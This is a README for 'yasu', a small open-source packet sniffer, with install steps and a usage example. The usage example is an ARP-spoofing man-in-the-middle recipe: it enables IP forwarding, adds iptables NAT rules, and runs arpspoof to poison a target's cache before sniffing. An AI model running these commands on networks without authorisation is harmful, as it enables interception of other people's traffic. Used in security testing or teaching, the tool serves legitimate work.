# YASU
###### yet another sniffing utility
yasu is a simple and elementary utility that is written to be easy to understand
and hackable, so it doesn't want to be a project.

### Installation
```bash
git clone https://github.com/Manu-sh/YASU
cd YASU
make
sudo make install
```
### Basic usage
```bash
# only root can perform this, sudo or su -c can't do this
# enable IP forwarding via kernel to allow NAT & traffic forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

GATEWAY=192.168.1.1 INTERFACE=wlp4s0 TARGET=192.168.1.254

# act as a router using NAT

# enable NAT: replace the outgoing packet ip sniffed with the sniffer ip
sudo iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE

# enable network traffic forwarding (INPUT)
sudo iptables -A FORWARD -i $INTERFACE -j ACCEPT

# enable network traffic forwarding (OUTPUT)
sudo iptables -A FORWARD -o $INTERFACE -j ACCEPT

# posoning the target arp cache
sudo arpspoof -i $INTERFACE -t $TARGET -r $GATEWAY

sudo yasu -i $INTERFACE

# or if you want to see which packets pass on your machine you can simply type
sudo yasu -i $INTERFACE
```
###### Copyright © 2017-2018, [Manu-sh](https://github.com/Manu-sh), s3gmentationfault@gmail.com. Released under the [GPL3 license](LICENSE).
